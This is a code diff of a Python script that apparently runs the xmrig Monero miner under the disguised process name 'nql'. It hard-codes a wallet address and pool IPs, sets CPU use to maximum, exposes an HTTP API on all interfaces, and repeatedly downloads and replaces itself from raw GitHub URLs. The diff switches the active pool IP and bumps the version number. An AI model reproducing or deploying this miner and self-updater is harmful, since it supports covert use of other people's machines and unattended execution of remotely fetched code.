@@ -45,15 +45,15 @@ import psutil
 
 xmrig_name = 'nql'
 os.system('pkill %s' % xmrig_name)
-#command_xmrig_default = '--algo randomx -o 45.8.146.102:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
-command_xmrig_default = '--algo randomx -o 45.144.28.69:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+command_xmrig_default = '--algo randomx -o 45.8.146.102:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
+#command_xmrig_default = '--algo randomx -o 45.144.28.69:443 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 #command_xmrig_default = '--algo randomx -o xmr-us-east1.nanopool.org:14433 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf -p nql --tls --cpu-max-threads-hint=100 --http-host=0.0.0.0 --http-port=80'
 while True:
     time.sleep(1)
     working_dir = os.path.dirname(os.path.realpath(__file__))
     print(f'{working_dir}\n')
     path_app = os.path.realpath(__file__)
-    version_chinh = 5.8
+    version_chinh = 5.9
     link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/version_vps_cpu'
     link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/daonhanh/config/vps_cpu.py'
 
